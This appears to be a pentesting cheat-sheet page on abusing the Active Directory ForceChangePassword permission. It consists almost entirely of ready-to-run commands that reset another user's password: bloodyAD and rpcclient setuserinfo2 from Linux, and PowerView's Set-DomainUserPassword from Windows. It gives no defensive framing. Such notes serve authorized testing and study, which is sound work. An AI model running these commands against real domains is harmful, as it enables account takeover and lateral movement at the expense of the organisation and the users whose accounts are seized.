---
title: "ForceChangePassword"
date: 2024-7-18
tags: ["ForceChangePassword", "active driectory", "ad", "Windows"]
---

---
### Change target user password (From Linux)

{{< tab set1 tab1 active >}}BloodyAD{{< /tab >}}
{{< tab set1 tab2 >}}rpcclient{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
```

</div>

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```bash
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <TARGET_USER_NEW_PASSWORD>'
```

</div>

{{< /tabcontent >}}

### Change target user password (From Windows)

{{< tab set2 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import PowerView.ps1

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Change Target User Password

<div>

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
```

```powershell
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

</div>

{{< /tabcontent >}}

<br>